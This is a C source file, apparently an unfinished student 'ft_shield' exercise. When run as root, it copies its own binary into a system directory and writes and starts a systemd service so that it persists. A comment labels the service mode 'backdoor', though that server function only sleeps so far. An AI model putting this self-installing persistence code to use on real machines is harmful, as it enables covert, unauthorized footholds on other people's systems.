#include "ft_shield.h"


void server() {
	syslog(LOG_INFO, "server started\n");
	while (1)
	{
		sleep(3);
	}
	syslog(LOG_ERR, "server closed\n");
}

int duplicate(char *exec_path)
{
	int	bin; // file descriptor of /bin/ft_shield
	int	usr; // file descriptor of program that user ran
	int	ret;
	char	buffer[1024];

	bin = open(BIN_PATH, O_CREAT | O_WRONLY | O_TRUNC, 755);
	if (bin < 0)
	{
		syslog(LOG_ERR, "failed to write %s\n", BIN_PATH);
		return (-1);
	}
	usr = open(exec_path, O_RDONLY);
	if (usr < 0)
	{
		close(bin);
		syslog(LOG_ERR, "failed to read %s\n", exec_path);
		return (-2);
	}
	while ((ret = read(usr, buffer, 1024)))
		write(bin, buffer, ret);
	close(bin);
	close(usr);
	syslog(LOG_INFO, "ft_shield duplicated successfully\n");
	return (0);
}

int daemonize()
{
	int fd = open(SYSTEMD_PATH"ft_shield.service", O_CREAT | O_TRUNC | O_WRONLY, 0755);
	if (fd >= 0)
	{
		syslog(LOG_INFO, "writing an unit: "SYSTEMD_PATH"ft_shield.service\n");
		if (write(fd, SYSTEMD_CONFIG, strlen(SYSTEMD_CONFIG)) == -1)
		{
			syslog(LOG_ERR, "failed to write systemd service unit\n");
			return -1;
		}
		chmod(SYSTEMD_PATH"ft_shield.service", 755);
		syslog(LOG_INFO, "systemd starting service\n");
		system("systemctl stop ft_shield");
		system("systemctl daemon-reload");
		system("systemctl start ft_shield");
	}
	else
	{
		// sysVinit
	}
}

int get_parent()
{
	pid_t ppid = getppid();
	char cmdline[256];
	snprintf(cmdline, sizeof(cmdline), "/proc/%d/comm", ppid);
	FILE *f = fopen(cmdline, "r");
	if (f)
	{
		char parent_proc[256];
		fgets(parent_proc, sizeof(parent_proc), f);
		syslog(LOG_INFO, "parent process: %s\n", parent_proc);
		fclose(f);
		if (strncmp(parent_proc, "systemd", 7) == 0) return 1;
		if (strncmp(parent_proc, "init", 4) == 0) return 2;
		if (strncmp(parent_proc, "bash", 4) == 0) return 3;
	}
	else
	{
		return -1;
	}
	return 0;
}

bool is_systemd()
{
	if (getenv("INVOCATION_ID"))
		return true;
	return false;
}

//  TO DO
//
//  [ ] remove dependancy of EXE_PATH - get rid of manually pointing the a.out file
//   - use /proc/self/exe?
//  [ ] sysvinit
//  [ ] describe in detail about get_parent and is_systemd functions in git commit



int main(int argc, char **argv)
{
	int	len;
	char	exec_path[256];

	if (geteuid())
	{
		printf("root permission required\n");
		return (-1);
	}
	openlog("ft_shield", LOG_PID | LOG_CONS, LOG_USER);
	len = readlink("/proc/self/exe", exec_path, sizeof(exec_path) - 1);
	if (len != -1)
	{
		exec_path[len] = '\0';
		syslog(LOG_INFO, "exec path: %s\n", exec_path);
	}
	else
	{
		syslog(LOG_ERR, "readlink failed\n");
	}
	// syslog(LOG_INFO, "/proc/self/exe: %s", exec_path);
	if (!is_systemd())
	{
		// ft_shield.out
		if (duplicate(exec_path) < 0) // copy binary to /bin directory
		{
			syslog(LOG_ERR, "failed to duplicate the program\n");
			return -1;
		}
		if (daemonize() < 0)
		{
			syslog(LOG_ERR, "failed to daemonize service\n");
			return -2;
		}
	}
	else
	{
		// backdoor
		server();
	}
	syslog(LOG_INFO, "process end: %s\n", exec_path);
	closelog();
	return (0);
}
